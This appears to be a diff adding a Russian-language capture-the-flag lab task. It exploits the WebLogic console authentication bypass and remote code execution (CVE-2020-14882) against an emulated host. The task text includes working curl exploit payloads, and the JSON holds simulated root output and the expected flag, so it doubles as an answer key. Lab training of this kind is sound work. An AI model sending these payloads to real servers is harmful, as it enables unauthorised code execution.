@@ -1,0 +1,47 @@
+{
+  "id": "web-weblogic",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{w3bl0g1c_c0ns0l3_byp4ss_un4uth_rce}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: WebLogic console.portal (CVE-2020-14882)\n\nЦель: `http://weblogic.local:7001`. Пароля нет — но консоль уязвима.\n\n1. Определи версию по странице входа:\n   curl -s http://weblogic.local:7001/console/login/LoginForm.jsp\n\n2. Проверь обход авторизации двойным кодированием точки в пути:\n   curl -s -o /dev/null -w '%{http_code}\\n' 'http://weblogic.local:7001/console/css/%252e%252e%252fconsole.portal'\n   (должно вернуть 200, а не 302)\n\n3. Выполни команду через handle с MVEL-обработчиком:\n   curl -s 'http://weblogic.local:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27id%27)%22)'\n\n4. В ответе сервер выполнит команду и отдаст вывод с флагом.\n   Сохрани вывод в found.txt и набери `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция weblogic.local)",
+      "cases": [
+        {
+          "match": "ShellSession|console\\.portal\\?_nfpb|exec",
+          "example": "-s 'http://weblogic.local:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&handle=...ShellSession(id)'",
+          "output": "<html><head><title>WebLogic Server</title></head><body>\nuid=0(root) gid=0(root) groups=0(root)\nnto{w3bl0g1c_c0ns0l3_byp4ss_un4uth_rce}\n</body></html>\n"
+        },
+        {
+          "match": "LoginForm\\.jsp",
+          "example": "-s http://weblogic.local:7001/console/login/LoginForm.jsp",
+          "output": "<META NAME=\"WebLogic Server Version\" CONTENT=\"12.2.1.3.0\">\n<html><body><form action=\"j_security_check\">...Login...</form></body></html>\n"
+        },
+        {
+          "match": "console/css/%252e%252e%252fconsole\\.portal",
+          "example": "-s -o /dev/null -w '%{http_code}' '.../console/css/%252e%252e%252fconsole.portal'",
+          "output": "200\n"
+        },
+        {
+          "match": "console/?$|:7001/?$",
+          "example": "-s http://weblogic.local:7001/",
+          "output": "<html><head><title>Error 404--Not Found</title></head></html>\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только weblogic.local"
+    }
+  }
+}
